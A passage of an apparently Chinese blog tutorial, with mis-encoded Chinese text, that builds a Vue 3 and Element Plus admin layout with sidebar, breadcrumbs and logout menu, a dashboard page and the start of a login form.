<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { useUserStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/store'</span>
<span class="hljs-keyword">import</span> { computed, ref } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { useRoute, useRouter } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue-router'</span>

<span class="hljs-keyword">const</span> route = <span class="hljs-title function_">useRoute</span>()
<span class="hljs-keyword">const</span> router = <span class="hljs-title function_">useRouter</span>()
<span class="hljs-keyword">const</span> userStore = <span class="hljs-title function_">useUserStore</span>()

<span class="hljs-comment">// ä¾§è¾¹æ æŠ˜å æ§åˆ¶</span>
<span class="hljs-keyword">const</span> isCollapse = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">false</span>)
<span class="hljs-keyword">const</span> <span class="hljs-title function_">toggleSidebar</span> = (<span class="hljs-params"/>) =&gt; {
  isCollapse.<span class="hljs-property">value</span> = !isCollapse.<span class="hljs-property">value</span>
}

<span class="hljs-comment">// å½“å‰æ¿€æ´»èœå•</span>
<span class="hljs-keyword">const</span> activeMenu = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> route.<span class="hljs-property">path</span>)

<span class="hljs-comment">// é¢åŒ…å±‘æ•°æ®ç”Ÿæˆ</span>
<span class="hljs-keyword">const</span> breadcrumbs = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> matched = route.<span class="hljs-property">matched</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> item.<span class="hljs-property">meta</span> &amp;&amp; item.<span class="hljs-property">meta</span>.<span class="hljs-property">title</span>)
  <span class="hljs-keyword">const</span> first = matched[<span class="hljs-number">0</span>]

  <span class="hljs-keyword">if</span> (!first || first.<span class="hljs-property">path</span> !== <span class="hljs-string">'/dashboard'</span>) {
    <span class="hljs-keyword">return</span> [{ <span class="hljs-attr">path</span>: <span class="hljs-string">'/dashboard'</span>, <span class="hljs-attr">meta</span>: { <span class="hljs-attr">title</span>: <span class="hljs-string">'é¦–é¡µ'</span> } }].<span class="hljs-title function_">concat</span>(matched)
  }
  <span class="hljs-keyword">return</span> matched
})

<span class="hljs-comment">// é€€å‡ºç™»å½•</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleLogout</span> = (<span class="hljs-params"/>) =&gt; {
  router.<span class="hljs-title function_">push</span>(<span class="hljs-string">'/login'</span>)
}

<span class="hljs-comment">// ä¸‹æ‹‰èœå•æŒ‡ä»¤å¤„ç†</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleCommand</span> = (<span class="hljs-params">command</span>) =&gt; {
  <span class="hljs-keyword">if</span> (command === <span class="hljs-string">'logout'</span>) {
    <span class="hljs-title function_">handleLogout</span>()
  }
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">el-container</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"app-wrapper"</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- ä¾§è¾¹æ  --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">transition</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"sidebar-resize"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">el-aside</span> <span class="hljs-attr">:width</span>=<span class="hljs-string">"isCollapse ? '64px' : '220px'"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"sidebar-container"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"logo-container"</span> <span class="hljs-attr">:class</span>=<span class="hljs-string">"{ collapsed: isCollapse }"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"logo-box"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">i-ep-element-plus</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"logo-icon"</span> /&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"logo-text"</span> <span class="hljs-attr">v-show</span>=<span class="hljs-string">"!isCollapse"</span>&gt;</span>Admin Elite<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">el-scrollbar</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">el-menu</span> <span class="hljs-attr">:default-active</span>=<span class="hljs-string">"activeMenu"</span> <span class="hljs-attr">:collapse</span>=<span class="hljs-string">"isCollapse"</span> <span class="hljs-attr">:collapse-transition</span>=<span class="hljs-string">"false"</span> <span class="hljs-attr">unique-opened</span> <span class="hljs-attr">router</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"el-menu-vertical"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">el-menu-item</span> <span class="hljs-attr">index</span>=<span class="hljs-string">"/dashboard"</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">el-icon</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">i-ep-odometer</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">el-icon</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">template</span> #<span class="hljs-attr">title</span>&gt;</span>ä»ªè¡¨ç›˜<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">el-menu-item</span>&gt;</span>

            <span class="hljs-tag">&lt;<span class="hljs-name">el-sub-menu</span> <span class="hljs-attr">index</span>=<span class="hljs-string">"/user"</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">template</span> #<span class="hljs-attr">title</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">el-icon</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">i-ep-user</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">el-icon</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>ç”¨æˆ·ç®¡ç†<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
              <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">el-menu-item</span> <span class="hljs-attr">index</span>=<span class="hljs-string">"/user/list"</span>&gt;</span>ç”¨æˆ·åˆ—è¡¨<span class="hljs-tag">&lt;/<span class="hljs-name">el-menu-item</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">el-menu-item</span> <span class="hljs-attr">index</span>=<span class="hljs-string">"/user/role"</span>&gt;</span>è§’è‰²æƒé™<span class="hljs-tag">&lt;/<span class="hljs-name">el-menu-item</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">el-sub-menu</span>&gt;</span>

            <span class="hljs-tag">&lt;<span class="hljs-name">el-menu-item</span> <span class="hljs-attr">index</span>=<span class="hljs-string">"/settings"</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">el-icon</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">i-ep-setting</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">el-icon</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">template</span> #<span class="hljs-attr">title</span>&gt;</span>ç³»ç»Ÿè®¾ç½®<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">el-menu-item</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">el-menu</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">el-scrollbar</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">el-aside</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">transition</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- ä¸»å®¹å™¨ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">el-container</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"main-container"</span>&gt;</span>
      <span class="hljs-comment">&lt;!-- é¡¶éƒ¨å¯¼èˆªæ  --&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">el-header</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"navbar"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"navbar-left"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"hamburger"</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"toggleSidebar"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">el-icon</span> <span class="hljs-attr">size</span>=<span class="hljs-string">"20"</span> <span class="hljs-attr">:class</span>=<span class="hljs-string">"{ 'is-active': isCollapse }"</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">i-ep-fold</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"!isCollapse"</span> /&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">i-ep-expand</span> <span class="hljs-attr">v-else</span> /&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">el-icon</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

          <span class="hljs-tag">&lt;<span class="hljs-name">el-breadcrumb</span> <span class="hljs-attr">separator</span>=<span class="hljs-string">"/"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"breadcrumb"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">el-breadcrumb-item</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">"(item, index) in breadcrumbs"</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">"item.path"</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"index === breadcrumbs.length - 1"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"no-redirect"</span>&gt;</span>{{ item.meta.title }}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">v-else</span> @<span class="hljs-attr">click.prevent</span>=<span class="hljs-string">"router.push(item.path)"</span>&gt;</span>{{ item.meta.title }}<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">el-breadcrumb-item</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">el-breadcrumb</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"navbar-right"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">el-dropdown</span> <span class="hljs-attr">trigger</span>=<span class="hljs-string">"click"</span> @<span class="hljs-attr">command</span>=<span class="hljs-string">"handleCommand"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"avatar-wrapper"</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">el-avatar</span> <span class="hljs-attr">:size</span>=<span class="hljs-string">"32"</span> <span class="hljs-attr">:src</span>=<span class="hljs-string">"userStore.avatar"</span> /&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"user-name"</span>&gt;</span>{{ userStore.username }}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">el-icon</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"el-icon--right"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">i-ep-arrow-down</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">el-icon</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">template</span> #<span class="hljs-attr">dropdown</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">el-dropdown-menu</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">el-dropdown-item</span>&gt;</span>ä¸ªäººä¸­å¿ƒ<span class="hljs-tag">&lt;/<span class="hljs-name">el-dropdown-item</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">el-dropdown-item</span> <span class="hljs-attr">divided</span> <span class="hljs-attr">command</span>=<span class="hljs-string">"logout"</span>&gt;</span>é€€å‡ºç™»å½•<span class="hljs-tag">&lt;/<span class="hljs-name">el-dropdown-item</span>&gt;</span>
              <span class="hljs-tag">&lt;/<span class="hljs-name">el-dropdown-menu</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">el-dropdown</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">el-header</span>&gt;</span>

      <span class="hljs-comment">&lt;!-- å†…å®¹åŒº --&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">el-main</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"app-main"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">router-view</span> <span class="hljs-attr">v-slot</span>=<span class="hljs-string">"{ Component }"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">transition</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"fade-transform"</span> <span class="hljs-attr">mode</span>=<span class="hljs-string">"out-in"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">:is</span>=<span class="hljs-string">"Component"</span> /&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">transition</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">router-view</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">el-main</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">el-container</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">el-container</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"scss"</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.app-wrapper</span> {
  <span class="hljs-attribute">position</span>: relative;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">100vh</span>;
  <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;
  <span class="hljs-attribute">display</span>: flex;
}

<span class="hljs-comment">/* Sidebar Styling - Light Theme */</span>
<span class="hljs-selector-class">.sidebar-container</span> {
  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#ffffff</span>;
  <span class="hljs-attribute">border-right</span>: <span class="hljs-number">1px</span> solid <span class="hljs-built_in">var</span>(--el-border-color-light);
  <span class="hljs-attribute">transition</span>: width <span class="hljs-number">0.3s</span> <span class="hljs-built_in">cubic-bezier</span>(<span class="hljs-number">0.25</span>, <span class="hljs-number">0.8</span>, <span class="hljs-number">0.25</span>, <span class="hljs-number">1</span>);
  <span class="hljs-attribute">display</span>: flex;
  <span class="hljs-attribute">flex-direction</span>: column;
  <span class="hljs-attribute">z-index</span>: <span class="hljs-number">1001</span>;
  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">2px</span> <span class="hljs-number">0</span> <span class="hljs-number">8px</span> <span class="hljs-number">0</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">29</span>, <span class="hljs-number">35</span>, <span class="hljs-number">41</span>, <span class="hljs-number">0.05</span>);

  <span class="hljs-selector-class">.logo-container</span> {
    <span class="hljs-attribute">height</span>: <span class="hljs-number">60px</span>;
    <span class="hljs-attribute">flex-shrink</span>: <span class="hljs-number">0</span>;
    <span class="hljs-attribute">display</span>: flex;
    <span class="hljs-attribute">align-items</span>: center;
    <span class="hljs-attribute">justify-content</span>: center;
    // <span class="hljs-attribute">border-bottom</span>: <span class="hljs-number">1px</span> solid <span class="hljs-built_in">var</span>(--el-border-color-lighter);
    <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#ffffff</span>;
    <span class="hljs-attribute">transition</span>: all <span class="hljs-number">0.3s</span>;
    <span class="hljs-attribute">overflow</span>: hidden;

    <span class="hljs-selector-class">.logo-box</span> {
      <span class="hljs-attribute">width</span>: <span class="hljs-number">32px</span>;
      <span class="hljs-attribute">height</span>: <span class="hljs-number">32px</span>;
      <span class="hljs-attribute">display</span>: flex;
      <span class="hljs-attribute">align-items</span>: center;
      <span class="hljs-attribute">justify-content</span>: center;
      <span class="hljs-attribute">background</span>: <span class="hljs-built_in">var</span>(--el-color-primary);
      <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">8px</span>;
      <span class="hljs-attribute">margin-right</span>: <span class="hljs-number">10px</span>;
      <span class="hljs-attribute">color</span>: <span class="hljs-number">#fff</span>;
      <span class="hljs-attribute">font-size</span>: <span class="hljs-number">20px</span>;
      <span class="hljs-attribute">transition</span>: all <span class="hljs-number">0.3s</span>;
    }

    <span class="hljs-selector-class">.logo-text</span> {
      <span class="hljs-attribute">font-weight</span>: <span class="hljs-number">600</span>;
      <span class="hljs-attribute">font-size</span>: <span class="hljs-number">18px</span>;
      <span class="hljs-attribute">color</span>: <span class="hljs-built_in">var</span>(--el-text-color-primary);
      <span class="hljs-attribute">white-space</span>: nowrap;
      <span class="hljs-attribute">font-family</span>: <span class="hljs-string">'Inter'</span>, sans-serif;
    }

    &amp;<span class="hljs-selector-class">.collapsed</span> {
      <span class="hljs-selector-class">.logo-box</span> {
        <span class="hljs-attribute">margin-right</span>: <span class="hljs-number">0</span>;
      }
    }
  }

  <span class="hljs-selector-class">.el-menu-vertical</span> {
    <span class="hljs-attribute">border-right</span>: none;

    :<span class="hljs-built_in">deep</span>(.el-menu-item) {
      &amp;<span class="hljs-selector-class">.is-active</span> {
        <span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">var</span>(--el-color-primary-light-<span class="hljs-number">9</span>);
        <span class="hljs-attribute">color</span>: <span class="hljs-built_in">var</span>(--el-color-primary);
        <span class="hljs-attribute">border-right</span>: <span class="hljs-number">3px</span> solid <span class="hljs-built_in">var</span>(--el-color-primary);
      }

      &amp;<span class="hljs-selector-pseudo">:hover</span> {
        <span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">var</span>(--el-fill-color-light);
      }
    }
  }
}

<span class="hljs-comment">/* Navbar Styling */</span>
<span class="hljs-selector-class">.navbar</span> {
  <span class="hljs-attribute">height</span>: <span class="hljs-number">60px</span>;
  <span class="hljs-attribute">overflow</span>: hidden;
  <span class="hljs-attribute">position</span>: relative;
  <span class="hljs-attribute">background</span>: <span class="hljs-number">#fff</span>;
  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">1px</span> <span class="hljs-number">4px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">21</span>, <span class="hljs-number">41</span>, <span class="hljs-number">0.08</span>);
  <span class="hljs-attribute">display</span>: flex;
  <span class="hljs-attribute">align-items</span>: center;
  <span class="hljs-attribute">justify-content</span>: space-between;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span> <span class="hljs-number">20px</span>;

  <span class="hljs-selector-class">.navbar-left</span> {
    <span class="hljs-attribute">display</span>: flex;
    <span class="hljs-attribute">align-items</span>: center;
  }

  <span class="hljs-selector-class">.hamburger</span> {
    <span class="hljs-attribute">cursor</span>: pointer;
    <span class="hljs-attribute">margin-right</span>: <span class="hljs-number">20px</span>;
    <span class="hljs-attribute">display</span>: flex;
    <span class="hljs-attribute">align-items</span>: center;
    <span class="hljs-attribute">color</span>: <span class="hljs-built_in">var</span>(--el-text-color-regular);
    <span class="hljs-attribute">transition</span>: color <span class="hljs-number">0.3s</span>;

    &amp;<span class="hljs-selector-pseudo">:hover</span> {
      <span class="hljs-attribute">color</span>: <span class="hljs-built_in">var</span>(--el-color-primary);
    }
  }

  <span class="hljs-selector-class">.breadcrumb</span> {
    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">14px</span>;
    <span class="hljs-attribute">line-height</span>: <span class="hljs-number">50px</span>;

    <span class="hljs-selector-class">.no-redirect</span> {
      <span class="hljs-attribute">color</span>: <span class="hljs-built_in">var</span>(--el-text-color-primary);
      <span class="hljs-attribute">cursor</span>: text;
      <span class="hljs-attribute">font-weight</span>: <span class="hljs-number">600</span>;
    }

    <span class="hljs-selector-tag">a</span> {
      <span class="hljs-attribute">color</span>: <span class="hljs-built_in">var</span>(--el-text-color-regular);
      <span class="hljs-attribute">cursor</span>: pointer;
      <span class="hljs-attribute">font-weight</span>: normal;

      &amp;<span class="hljs-selector-pseudo">:hover</span> {
        <span class="hljs-attribute">color</span>: <span class="hljs-built_in">var</span>(--el-color-primary);
      }
    }
  }

  <span class="hljs-selector-class">.navbar-right</span> {
    <span class="hljs-attribute">display</span>: flex;
    <span class="hljs-attribute">align-items</span>: center;

    <span class="hljs-selector-class">.avatar-wrapper</span> {
      <span class="hljs-attribute">display</span>: flex;
      <span class="hljs-attribute">align-items</span>: center;
      <span class="hljs-attribute">cursor</span>: pointer;
      <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span> <span class="hljs-number">8px</span>;
      <span class="hljs-attribute">transition</span>: background <span class="hljs-number">0.3s</span>;
      <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;

      &amp;<span class="hljs-selector-pseudo">:hover</span> {
        <span class="hljs-attribute">background</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.025</span>);
      }

      <span class="hljs-selector-class">.user-name</span> {
        <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> <span class="hljs-number">8px</span>;
        <span class="hljs-attribute">font-size</span>: <span class="hljs-number">14px</span>;
        <span class="hljs-attribute">color</span>: <span class="hljs-built_in">var</span>(--el-text-color-regular);
      }
    }
  }
}

<span class="hljs-comment">/* Main Content Styling */</span>
<span class="hljs-selector-class">.main-container</span> {
  <span class="hljs-attribute">min-height</span>: <span class="hljs-number">100vh</span>;
  <span class="hljs-attribute">transition</span>: margin-left <span class="hljs-number">0.28s</span>;
  <span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">var</span>(--app-bg-color);
}

<span class="hljs-selector-class">.app-main</span> {
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
  <span class="hljs-attribute">overflow-x</span>: hidden;
}

<span class="hljs-comment">/* Transitions */</span>
<span class="hljs-selector-class">.fade-transform-enter-active</span>,
<span class="hljs-selector-class">.fade-transform-leave-active</span> {
  <span class="hljs-attribute">transition</span>: all <span class="hljs-number">0.5s</span>;
}

<span class="hljs-selector-class">.fade-transform-enter-from</span> {
  <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(-<span class="hljs-number">30px</span>);
}

<span class="hljs-selector-class">.fade-transform-leave-to</span> {
  <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(<span class="hljs-number">30px</span>);
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<h3 data-id="heading-14">åˆ›å»ºåŸºç¡€é¡µé¢</h3>
<p>åœ¨ <code>src/views</code> ä¸‹åˆ›å»ºè‡ªå·±çš„ä¸šåŠ¡é¡µé¢ï¼Œæ–°å»º <code>src/views/dashboard/index.vue</code>ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">el-card</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">template</span> #<span class="hljs-attr">header</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-header"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>Dashboard<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"welcome-text"</span>&gt;</span>
      æ¬¢è¿ä½¿ç”¨ Element Plus åå°ç®¡ç†ç³»ç»Ÿ
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">el-card</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.welcome-text</span> {
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">20px</span>;
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#333</span>;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<h3 data-id="heading-15">ç™»å½•é¡µé¢</h3>
<p>ä¸ºäº†æœ‰å¤´æœ‰è„¸å†ç”¨ AI æä¸ªç™»å½•é¡µé¢ <code>src/views/login</code>ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { getUserInfo, login } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/api/user'</span>
<span class="hljs-keyword">import</span> { useUserStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/store'</span>
<span class="hljs-keyword">import</span> { reactive, ref } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { useRouter } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue-router'</span>

<span class="hljs-keyword">const</span> router = <span class="hljs-title function_">useRouter</span>()
<span class="hljs-keyword">const</span> loginFormRef = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">null</span>)
<span class="hljs-keyword">const</span> loading = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">false</span>)

<span class="hljs-keyword">const</span> loginForm = <span class="hljs-title function_">reactive</span>({
  <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>,
  <span class="hljs-attr">password</span>: <span class="hljs-string">''</span>,
  <span class="hljs-attr">rememberMe</span>: <span class="hljs-literal">false</span>,
})

<span class="hljs-keyword">const</span> loginRules = {
  <span class="hljs-attr">username</span>: [
    { <span class="hljs-attr">required</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">message</span>: <span class="hljs-string">'è¯·è¾“å…¥ç”¨æˆ·å'</span>, <span class="hljs-attr">trigger</span>: <span class="hljs-string">'blur'</span> },
    { <span class="hljs-attr">min</span>: <span class="hljs-number">3</span>, <span class="hljs-attr">message</span>: <span class="hljs-string">'ç”¨æˆ·åé•¿åº¦ä¸èƒ½å°‘äº3ä½'</span>, <span class="hljs-attr">trigger</span>: <span class="hljs-string">'blur'</span> },
  ],
  <span class="hljs-attr">password</span>: [
    { <span class="hljs-attr">required</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">message</span>: <span class="hljs-string">'è¯·è¾“å…¥å¯†ç '</span>, <span class="hljs-attr">trigger</span>: <span class="hljs-string">'blur'</span> },
    { <span class="hljs-attr">min</span>: <span class="hljs-number">6</span>, <span class="hljs-attr">message</span>: <span class="hljs-string">'å¯†ç é•¿åº¦ä¸èƒ½å°‘äº6ä½'</span>, <span class="hljs-attr">trigger</span>: <span class="hljs-string">'blur'</span> },
  ],
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleLogin</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">if</span> (!loginFormRef.<span class="hljs-property">value</span>) <span class="hljs-keyword">return</span>

  <span class="hljs-keyword">await</span> loginFormRef.<span class="hljs-property">value</span>.<span class="hljs-title function_">validate</span>(<span class="hljs-keyword">async</span> (valid) =&gt; {
    <span class="hljs-keyword">if</span> (valid) {
      loading.<span class="hljs-property">value</span> = <span class="hljs-literal">true</span>

      <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">login</span>(loginForm)

